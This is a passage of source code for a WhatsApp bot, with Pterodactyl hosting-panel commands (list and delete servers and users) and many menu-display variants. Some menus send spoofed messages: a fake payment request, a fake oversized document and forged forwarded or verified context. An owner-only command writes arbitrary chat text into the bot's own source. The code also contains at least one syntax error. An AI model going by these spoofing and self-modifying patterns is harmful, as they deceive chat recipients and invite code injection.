
*Rules Pembelian Panel ⚠️*
* Simpan Data Ini Sebaik Mungkin, Seller Hanya Mengirim 1 Kali!
* Data Hilang/Lupa Akun, Seller Tidak Akan Bertanggung Jawab!
* Garansi Aktif 10 Hari (1x replace)
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
await Yasam.sendMessage(orang, {text: teks}, {quoted: m})
delete global.panel
}
break
case "listpanel": case "listp": case "listserver": {
if (!isCreator && !isPremium) return Reply(mess.owner)
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
});
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return m.reply("Tidak Ada Server Bot")
let messageText = "\n *乂 List server panel pterodactyl*\n"
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikey
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
messageText += `\n* ID : *${s.id}*
* Nama : *${s.name}*
* Ram : *${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.toString().length > 4 ? s.limits.memory.toString().split("").slice(0,2).join("") + "GB" : s.limits.memory.toString().length < 4 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"}*
* CPU : *${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}*
* Disk : *${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"}*
* Created : ${s.created_at.split("T")[0]}\n`
}
await Yasam.sendMessage(m.chat, {text: messageText}, {quoted: m})
}
break
case "delpanel": {
if (!YasamCreator && !isPremium) return reply(mess.owner)
if (!text) return m.reply("idnya"))
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let result = await f.json()
let servers = result.data
let sections
let nameSrv
for (let server of servers) {
let s = server.attributes
if (Number(text) == s.id) {
sections = s.name.toLowerCase()
nameSrv = s.name
let f = await fetch(domain + `/api/application/servers/${s.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
}}
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
for (let user of users) {
let u = user.attributes
if (u.first_name.toLowerCase() == sections) {
let delusr = await fetch(domain + `/api/application/users/${u.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}}
if (sections == undefined) return m.reply("Server panel tidak ditemukan!")
m.reply(`Berhasil menghapus server panel *${capital(nameSrv)}*`)
}
break
case "listadmin": {
if (!YasamCreator) return Reply(mess.owner)
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
if (users.length < 1 ) return m.reply("Tidak ada admin panel")
let teks = "\n *乂 List admin panel pterodactyl*\n"
await users.forEach((i) => {
if (i.attributes.root_admin !== true) return
teks += `\n* ID : *${i.attributes.id}*
* Nama : *${i.attributes.first_name}*
* Created : ${i.attributes.created_at.split("T")[0]}\n`
})
await Yasam.sendMessage(m.chat, {text: teks}, {quoted: m})
}
break
case 'addcase': {
    if (!YasamCreator) return replygcxeon (mess.owner)
    if (!text) return replygcxeon('Mana case nya');
    const fs = require('fs');
// Nama file yang akan dimodifikasi
const namaFile = 'XeonCheems13.js';

// Kode case baru yang ingin Anda tambahkan
const caseBaru = `${text}`;

// Baca isi file
fs.readFile(namaFile, 'utf8', (err, data) => {
    if (err) {
        console.error('Terjadi kesalahan saat membaca file:', err);
        return;
    }

    // Cari posisi awal dari kumpulan case 'gimage'
    const posisiAwalGimage = data.indexOf("case 'addcase':");

    if (posisiAwalGimage !== -1) {
        // Tambahkan case baru tepat di atas case 'gimage'
        const kodeBaruLengkap = data.slice(0, posisiAwalGimage) + '\n' + caseBaru + '\n' + data.slice(posisiAwalGimage);

        // Tulis kembali file dengan case baru
        fs.writeFile(namaFile, kodeBaruLengkap, 'utf8', (err) => {
            if (err) {
                replygcxeon('Terjadi kesalahan saat menulis file:', err);
            } else {
                replygcxeon('Case baru berhasil ditambahkan di atas case gimage.');
            }
        });
    } else {
        replygcxeon('Tidak dapat menemukan case gimage dalam file.');
    }
});
}
break
case 'listcase': {
if (!YasamCreator) return replygcxeon (mess.owner)
let { listCase } = require('./lib/scrapelistCase.js')
replygcxeon(listCase())
}      
break
  case 'totalfeature':
        case 'totalfitur': 
        case 'totalcmd': 
        case 'totalcommand': 
            replygcxeon(`Total Features of ${botname} is ${xeonfeature()}`)
        break
                     case 'menu':
            case 'help': {
         if (isBan) return reply(mess.ban) 
	    if (!isRegistered) return reply(mess.daftar)	
            let ownernya = ownernumber + '@s.whatsapp.net'
            let timestampe = speed()
            let latensie = speed() - timestampe
            let a = db.data.users[sender]
            let me = m.sender
            let xmenu_oh = `Hi ${pushname} ${xeonytimewisher}\n\
▧ 「 *I N F O  U S E R* 」

   ☍ *Name:* ${pushname}
   ☍ *Number:* ${m.sender.split('@')[0]}
   ☍ *Status:* ${YasamCreator ? "Owner 🥶" : "User ⭐"}
   ☍ *User:* ${isPremium ? 'Premium 🥶' : 'Gratisan ⭐'}
   ☍ *Limit:* ${!YasamCreator ? 'Unlimited 🥶' : `${db.data.users[m.sender].limit}⭐`}
┌─────────────┈ ⳹
│❏${prefix}allmenu
│❏${prefix}searchmenu
│❏${prefix}downloadmenu
│❏${prefix}gamemenu
│❏${prefix}funmenu
│❏${prefix}aimenu
│❏${prefix}groupmenu
│❏${prefix}ownermenu
│❏${prefix}convertmenu
│❏${prefix}listmenu
│❏${prefix}religionmenu
│❏${prefix}photooxymenu
│❏${prefix}animemenu
│❏${prefix}nsfwmenu
│❏${prefix}randomphotomenu
│❏${prefix}randomvideomenu
│❏${prefix}stickermenu
│❏${prefix}databasemenu
│❏${prefix}storemenu
│❏${prefix}stalkermenu
│❏${prefix}bugmenu
│❏${prefix}othermenu
└─────────────────┈ ⳹`
if (typemenu === 'v1') {
                Yasam.sendMessage(m.chat, {
                    text: xmenu_oh,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: botname,
                            body: ownername,
                            thumbnailUrl: 'https://files.catbox.moe/9fok4g.jpg',
                            sourceUrl: wagc,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: fvrif
                })                
        } else if (typemenu === 'v2') {
        	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image :fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: Yasam.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [        
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Allmenu 🌐","id":"${prefix}allmenu"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Kembali ⛔","id":"${prefix}menu"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, {})

await Yasam.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
                }   if (typemenu === 'v3') {
                    Yasam.sendMessage(m.chat, {
                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: fvrif
                    })
                } else if (typemenu === 'v4') {
                    Yasam.sendMessage(m.chat, {
                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: fvrif
                    })
                } else if (typemenu === 'v5') {
                    Yasam.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    Yasam.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    Yasam.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	Yasam.sendMessage(m.chat, {
      video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://files.catbox.moe/9fok4g.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }}, {
                        quoted: fvrif
                    })
      } else if (typemenu === 'v9') {
                	Yasam.sendMessage(m.chat, {
video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363222395675670@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://files.catbox.moe/9fok4g.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: fvrif
})
} else if (typemenu === 'v10') {
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: xmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/Yasam\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          })
        })
    }
  }
}, {})

await Yasam.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 'v11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: xmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: Yasam.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/Yasam\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, {})
      
      await Yasam.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 'v12') {
        	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh2
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: Yasam.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"MENU 🌺",
"sections":[{"title":"${botname}",
"rows":[{"header":"ALL MENU",
"title":"click to display",
"description":"Displays The List Of All The Features",
"id":"${prefix}allmenu"},
{"header":"SEARCH MENU",
"title":"click to display",
"description":"Displays The List Of Search Features",
"id":"${prefix}searchmenu"},
{"header":"DOWNLOAD MENU",
"title":"click to display",
"description":"Displays The List Of Download Features",
"id":"${prefix}downloadmenu"},
{"header":"GAME MENU",
"title":"click to display",
"description":"Displays The List Of Game Features",
"id":"${prefix}gamemenu"},
{"header":"FUN MENU",
"title":"click to display",
"description":"Displays The List Of Fun Features",
"id":"${prefix}funmenu"},
{"header":"AI MENU",
"title":"click to display",
"description":"Displays The List Of AI Features",
"id":"${prefix}aimenu"},
{"header":"GROUP MENU",
"title":"click to display",
"description":"Displays The List Of Group Features",
"id":"${prefix}groupmenu"},
{"header":"OWNER MENU",
"title":"click to display",
"description":"Displays The List Of Owner Features",
"id":"${prefix}ownermenu"},
{"header":"CONVERT MENU",
"title":"click to display",
"description":"Displays The List Of Convert Features",
"id":"${prefix}convertmenu"},
{"header":"LIST MENU",
"title":"click to display",
"description":"Displays The List Of List Features",
"id":"${prefix}listmenu"},
{"header":"RELIGION MENU",
"title":"click to display",
"description":"Displays The List Of Religion Features",
"id":"${prefix}religionmenu"},
{"header":"PHOTOXY MENU",
"title":"click to display",
"description":"Displays The List Of Photooxy Features",
"id":"${prefix}photooxymenu"},
{"header":"NSFW MENU",
"title":"click to display",
"description":"Displays The List Of NSFW Features",
"id":"${prefix}nsfwmenu"},
{"header":"ANIME MENU",
"title":"click to display",
"description":"Displays The List Of Anime Features",
"id":"${prefix}animemenu"},
{"header":"RANDOM PHOTO MENU",
"title":"click to display",
"description":"Displays The List Of Random Photo Features",
"id":"${prefix}randomphotomenu"},
{"header":"RANDOM VIDEO MENU",
"title":"click to display",
"description":"Displays The List Of Random Video Features",
"id":"${prefix}randomvideomenu"},
{"header":"STICKER MENU",
"title":"click to display",
"description":"Displays The List Of Sticker Features",
"id":"${prefix}stickermenu"},
{"header":"DATABASE MENU",
"title":"click to display",
"description":"Displays The List Of Database Features",
"id":"${prefix}databasemenu"},
{"header":"STORE MENU",
"title":"click to display",
"description":"Displays The List Of Store Features",
"id":"${prefix}storemenu"},
{"header":"STALKER MENU",
"title":"click to display",
"description":"Displays The List Of Stalk Features",
"id":"${prefix}stalkermenu"},
{"header":"BUG MENU",
"title":"click to display",
"description":"Displays The List Of Bug Features",
"id":"${prefix}bugmenu"},
{"header":"OTHER MENU",
"title":"click to display",
"description":"Displays The List Of Other Features",
"id":"${prefix}othermenu"}]
}]
}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/Yasam\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, {})

await Yasam.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
            case 'allmenu': {
	if (isBan) return reply(mess.ban) 
	if (!isRegistered) return reply(mess.daftar)            	
let xmenu_oh = `Hi ${pushname} ${xeonytimewisher}\n\
▧ 「 *I N F O  U S E R* 」

   ☍ *Name:* ${pushname}
   ☍ *Number:* ${m.sender.split('@')[0]}
   ☍ *Status:* ${YasamCreator ? "Owner 🥶" : "User ⭐"}
   ☍ *User:* ${isPremium ? 'Premium 🥶' : 'Gratisan ⭐'}
   ☍ *Limit:* ${!YasamCreator ? 'Unlimited 🥶' : `${db.data.users[m.sender].limit}⭐`}
${cmenut} ${readmore}\n\n${allmenu(prefix, hituet)}`
if (typemenu === 'v1') {
                Yasam.sendMessage(m.chat, {
                    text: xmenu_oh,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: botname,
                            body: ownername,
                            thumbnailUrl: 'https://files.catbox.moe/9fok4g.jpg',
                            sourceUrl: wagc,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: fvrif
                })                
                } else if (typemenu === 'v2') {
                    Yasam.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fvrif
                    })
                }   if (typemenu === 'v3') {
                    Yasam.sendMessage(m.chat, {
                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: fvrif
                    })
                } else if (typemenu === 'v4') {
                    Yasam.sendMessage(m.chat, {
                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: fvrif
                    })
                } else if (typemenu === 'v5') {
                    Yasam.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    Yasam.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    Yasam.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	Yasam.sendMessage(m.chat, {
      video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://files.catbox.moe/9fok4g.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: fvrif
                    })
                    } else if (typemenu === 'v9') {
                	Yasam.sendMessage(m.chat, {
video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363222395675670@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://files.catbox.moe/9fok4g.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: fvrif
})
} else if (typemenu === 'v10') {
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: xmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/Yasam\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          })
        })
    }
  }
}, {})

await Yasam.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 'v11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: xmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: Yasam.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/Yasam\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, {})
      
      await Yasam.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 'v12') {
        let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: Yasam.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"MENU 🌺",
"sections":[{"title":"${ownername}",
"highlight_label":"${botname}",
"rows":[{"header":"ALL MENU",
"title":"click to display",
"description":"Displays The List Of All The Features",
"id":"${prefix}allmenu"}]
